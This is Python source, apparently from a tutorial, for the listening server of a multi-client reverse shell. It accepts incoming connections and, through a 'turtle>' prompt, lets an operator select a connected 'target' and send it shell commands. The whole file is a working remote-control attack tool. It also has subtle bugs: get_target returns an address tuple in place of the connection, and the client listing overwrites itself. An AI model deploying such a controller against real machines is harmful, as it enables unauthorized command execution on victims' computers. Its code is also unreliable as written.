import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# create a socket (connect a computer)
def create_socket():
    try:
        global host
        global port
        global s
        host = "127.0.0.1"
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error " + str(msg))


# binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port " + str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket creation error " + str(msg) + "\n" + "Retrying...")
        bind_socket()  # Recursion


# handling connections from multiple clients and saving in a list
# closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]
    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(addr)

            print("Connection has been established : " + addr[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands

def start_turtle():  # custom shell or custom command prompt

    while True:
        cmd = input('turtle> ')  # current working directory like , turtle> will be shown
        if cmd == 'list':  # if input is list , it will show all the connections
            list_connections()

        elif 'select' in cmd:  # if there is keyword select in cmd then go further
            conn = get_target(cmd)  # get_target function returns a object conn which provide a response to cmd
            if conn is not None:  # if conn exists or not
                send_target_commands(conn)  # then send commands

        else:
            print("command not recognised")


# Display all current active connections with the client

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):  # after every iteration increase i and conn by 1
        try:
            conn.send(str.encode(' '))  # dummy connection
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "  " + str(all_address[i][0]) + str(all_address[i][1]) + '\n'

        # for ex -> 1 192.0.0.1

    print("---Clients---" + '\n' + results)


# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace("select ",
                             "")  # before target = select 1 afterwards target = 1 only the id is stored in target
        target = int(target)
        conn = all_address[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")  # format of shell 192.168.0.1> like this
        return conn

    except:
        print("Selection not valid")
        return None


# send commands to client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":  # quit command to end the socket
                break
            if len(str.encode(cmd)) > 0:  # if there is some command
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")  # end="" -> Used to go to next line
        except:
            print("Error sending comands")
            break
# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)  # actually creating a thread , whose function will be of work
        t.daemon = True  # When program ends Thread should also end otherwise the thread would still consume memory even if thr program is closed
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():   # simply creating a queue out of JOB_NUMBER because threads require queue format
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
